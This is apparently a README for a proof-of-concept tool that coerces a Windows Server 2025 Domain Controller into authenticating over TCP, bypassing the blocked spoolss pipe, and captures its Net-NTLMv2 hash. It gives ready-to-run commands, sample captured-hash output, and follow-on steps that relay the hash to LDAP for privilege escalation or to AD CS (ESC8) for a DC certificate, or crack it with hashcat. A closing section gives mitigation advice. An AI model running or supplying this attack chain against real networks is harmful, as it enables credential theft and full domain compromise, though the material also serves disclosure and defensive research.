# PrinterBug via TCP — Server 2025 `\pipe\spoolss` Bypass

Windows Server 2025 blocks remote access to `\pipe\spoolss`, breaking existing PrinterBug tooling that relies on the SMB named pipe transport. The Spooler service still registers itself on a dynamic TCP port via the Endpoint Mapper, however, leaving `RpcRemoteFindFirstPrinterChangeNotificationEx` fully callable over `ncacn_ip_tcp`. This repository contains a PoC that exploits this to coerce Net-NTLMv2 authentication from a Domain Controller's machine account.

Full write-up: [e1abrador.com](https://e1abrador.com/posts/printerbug-tcp-server-2025-bypass.html)

---

## How it works

1. `printerbug_tcp.py` queries EPM (port 135) to discover the Spooler's dynamic TCP port, then calls `RpcRemoteFindFirstPrinterChangeNotificationEx` over TCP — bypassing the named pipe block entirely.
2. The DC's machine account initiates an outbound NTLM-authenticated callback to the attacker's listener on port 135.
3. `epm_proxy.py` intercepts the callback, rewrites the EPM response to redirect the DC to a local capture service, and completes the NTLM handshake to extract the Net-NTLMv2 hash.

The NTLM challenge template is captured from the real DC at startup, so the fabricated challenge is consistent with what the target expects.

---

## Requirements

```
pip install impacket
```

The `rpcdump.py` script from impacket must be available in `PATH` for automatic port discovery.

---

## Usage

**Step 1 — Start the EPM proxy and capture service on the listener host:**

```bash
sudo python3 epm_proxy.py -dc <DC_IP> -l <LISTENER_IP> -u <USER> -p <PASS> -d <DOMAIN>
```

**Step 2 — Trigger the coercion from any host with domain credentials:**

```bash
python3 printerbug_tcp.py -t <DC_IP> -l <LISTENER_IP> -u <USER> -p <PASS> -d <DOMAIN>
```

If the Spooler port is already known it can be specified directly with `--port` to skip EPM discovery.

**Output:**

```
[*] PrinterBug via TCP — Server 2025 pipe bypass
[*] Target: 192.168.1.10 → Listener: 192.168.1.50

[*] Discovering Spooler TCP port via EPM...
[+] Spooler found on TCP/49667
[*] Note: \pipe\spoolss is blocked on Server 2025
[*] Bypassing via ncacn_ip_tcp:192.168.1.10[49667]

[*] Triggering callback to 192.168.1.50:135...
[+] Done — DC should callback to 192.168.1.50:135
```

```
[+++] Spooler callback from 192.168.1.10:54821
[+] NTLM Negotiate (232b)
[+] Challenge sent (186b)

============================================================
  NET-NTLMv2 CAPTURED!
  PSYCHOCORP\DC01$ @ DC01
  DC01$::PSYCHOCORP:a3f1c2e4b8d76a91:...
============================================================
[+] Saved to captured_hashes.txt
```

---

## Captured hash

The hash is saved to `captured_hashes.txt` in the current directory and can be relayed or cracked:

```bash
# Relay to LDAP
ntlmrelayx.py -t ldap://<DC_IP> --escalate-user <USER>

# Relay to AD CS (ESC8)
ntlmrelayx.py -t http://<CA_IP>/certsrv/certfnsh.asp --adcs --template DomainController

# Offline crack (low success rate against machine accounts)
hashcat -m 5600 captured_hashes.txt wordlist.txt
```

---

## Tested against

| Target OS | Result |
|---|---|
| Windows Server 2025 | Bypasses named pipe block via TCP |
| Windows Server 2022 | Works (named pipe also available) |
| Windows Server 2019 | Works (named pipe also available) |

Requires Print Spooler running on the target (default on all versions).

---

## Mitigation

Disable the Print Spooler service on Domain Controllers. It has no legitimate role there and this attack has no reliable transport-level workaround while the service is running.

```powershell
Stop-Service -Name Spooler -Force
Set-Service -Name Spooler -StartupType Disabled
```

---

## Disclaimer

This tool is intended for authorized penetration testing and security research only. Usage against systems without explicit written permission is illegal.
